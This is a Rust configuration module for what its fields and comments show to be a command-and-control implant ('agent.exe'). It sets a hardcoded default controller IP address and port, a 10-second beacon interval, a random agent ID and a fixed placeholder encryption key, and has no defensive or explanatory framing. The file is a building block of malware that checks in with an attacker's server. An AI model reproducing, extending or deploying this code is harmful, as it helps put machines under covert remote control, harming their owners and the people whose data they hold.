use std::env;

#[derive(Clone, Debug)]
pub struct Config {
    pub c2_url: String,
    pub c2_port: u16,
    pub encryption_key: [u8; 32],
    pub beacon_interval: u64,
    #[allow(dead_code)]
    pub agent_id: String,
    pub debug: bool,
}

impl Config {
    pub fn from_env() -> Result<Self, Box<dyn std::error::Error>> {
        // Check command line args: agent.exe [IP] [PORT]
        let args: Vec<String> = env::args().collect();
        let c2_url = if args.len() > 1 { args[1].clone() } else { "191.217.250.6".to_string() };
        let c2_port: u16 = if args.len() > 2 { args[2].parse().unwrap_or(8000) } else { 8000 };
        let beacon_interval: u64 = 10;
        let debug = true;
        let agent_id = uuid::Uuid::new_v4().to_string();
        let key_str = "0000000000000000000000000000000000000000000000000000000000000042";
        let encryption_key = Self::parse_key(key_str)?;

        Ok(Self {
            c2_url,
            c2_port,
            encryption_key,
            beacon_interval,
            agent_id,
            debug,
        })
    }

    pub fn validate(&self) -> Result<(), Box<dyn std::error::Error>> {
        if self.c2_url.is_empty() {
            return Err("C2_URL not set".into());
        }
        if self.beacon_interval == 0 {
            return Err("BEACON_INTERVAL must be > 0".into());
        }
        Ok(())
    }

    fn parse_key(key_str: &str) -> Result<[u8; 32], Box<dyn std::error::Error>> {
        if key_str.len() != 64 {
            return Err("Encryption key must be 64 hex characters".into());
        }

        let mut key = [0u8; 32];
        for (i, chunk) in key_str.as_bytes().chunks(2).enumerate() {
            if i >= 32 {
                break;
            }
            let hex_str = std::str::from_utf8(chunk)?;
            key[i] = u8::from_str_radix(hex_str, 16)?;
        }

        Ok(key)
    }
}
